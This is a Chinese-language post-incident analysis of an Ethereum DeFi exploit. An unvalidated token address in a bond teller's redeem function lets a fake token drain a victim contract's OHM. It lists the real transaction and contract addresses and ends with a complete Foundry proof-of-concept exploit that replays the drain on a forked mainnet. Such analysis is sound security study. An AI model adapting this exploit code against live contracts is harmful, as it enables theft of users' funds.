[toc]
## 事件基本情况
```
tx: 0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf
区块链：eth
发送者: 0x443cf223e209e5a2c08114a2501d8f0f9ec7d9be
受害者: 0x007fe7c498a2cf30971ad8f2cbc36bd14ac51156
攻击合约: 0xa29e4fe451ccfa5e7def35188919ad7077a4de8f
调用函数: 0x9c587698
调用区块高度: 15794363
OHM token地址：0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5
```


## hacker攻击流程
1. 攻击者调用redeem(address token, uint256 amount)方法，并传入参数攻击者地址，受害者合约总额。调用后发现victim的金额转移到了攻击者合约，攻击成功。
2. 查看redeem方法，发现合约没有对token进行校验，直接将OHM从token.underlying()地址转移到了msg.sender。

  流程图如下
![[Pasted image 20230518111337.png]]

  漏洞方法如图
![[Pasted image 20230518110954.png]]

## 攻击点复刻方式
1. 攻击者合约创建一个token
	1. 将underlying方法返回值设置为受害者地址。
	2. 将expiry方法返回值设置为小于block.timestamp
	3. burn方法可以不做任何处理
2. 攻击合约调用redeem方法，传入新建的token地址和victim拥有的OHM总量。

## 攻击模拟结果图
![[Pasted image 20230518105429.png]]

## 事件总结
`在对于传入地址的外部合约的调用中，一定要对地址进行检查，防止恶意地址的攻击`

## 攻击代码
``` java
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

  

import "forge-std/Test.sol";

  

import "./UniversalInterface.sol";

  

// 定义常量

address constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;

address constant victim = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;

uint256 constant BlockNumber = 15794363;

  

// 需要调用的不通用的接口

interface IBondFixedExpiryTeller {

    function redeem(address token_, uint256 amount_) external;

}

  

// 攻击中用到的新创建的合约

contract FakeToken{

    function underlying() external view returns(address) {

        return OHM;

    }

  

    function expiry() external pure returns (uint48 _expiry) {

        return 1;

    }

  

    function burn(address,uint256) external {

        // no thing

    }

}

interface OHMToken {

    function balanceOf(address) external returns(uint256);

}

  

contract Exploit is Test{

    function setUp() public {

        // cheats.createSelectFork();

        vm.createSelectFork("mainnet", BlockNumber);

        vm.label(OHM, "OHM");

        vm.label(victim, "victim");

    }

  

    function testExploit() public {

        // 创建假的token

        address fakeToken = address(new FakeToken());

        vm.label(fakeToken,"fakeToken");

        // 查看victim拥有多少OHM

        uint256 moneyBefore = OHMToken(OHM).balanceOf(victim);

        console.log("the money before the attack:",moneyBefore);

        // 开始攻击

        IBondFixedExpiryTeller(victim).redeem(fakeToken, moneyBefore);

  

        uint256 moneyAfter = OHMToken(OHM).balanceOf(victim);

  

        console.log("the money after the attack:",moneyAfter);

        console.log("attack success!");

    }

}
```
